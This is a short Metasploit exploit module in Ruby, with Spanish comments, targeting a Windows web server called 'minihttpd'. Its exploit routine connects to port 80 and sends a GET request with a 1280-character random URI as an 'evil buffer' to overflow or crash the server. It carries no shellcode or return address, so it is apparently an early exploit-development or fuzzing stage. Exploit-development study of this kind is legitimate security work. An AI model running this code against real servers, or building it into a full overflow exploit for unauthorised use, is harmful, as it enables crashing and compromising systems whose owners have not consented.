##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    include Msf::Exploit::Remote::Tcp

    def initialize(info={})
        super(update_info(info,
            'Name'          => "Minihttpd.exe exploit",
            'Description'   => %q{
                    Exploit para servidor web "minihttpd" 
            },
            'License'       => MSF_LICENSE,
            'Author'        =>  "Nacho Sorribas",
	    'Platform'	    => "win",
	    'Targets'	    => [['Automatic',{}]],
            'DefaultTarget' => 0))
        register_options(
            [
		Opt::RPORT(80) # Puerto del servidor web
            ], self.class)
    end

    # Esta es la función que se ejecuta al hacer “run” o “exploit”
    def exploit 
        uri = Rex::Text.rand_text_alphanumeric(1280) # fuzzing data
        print_status("Sending evil buffer, buffer lenght = %d" % uri.length)
        connect()
        sock.put("GET /#{uri}HTTP/1.1\r\n\r\n")
        res = sock.get_once(-1,1)
	disconnect()
    end

end
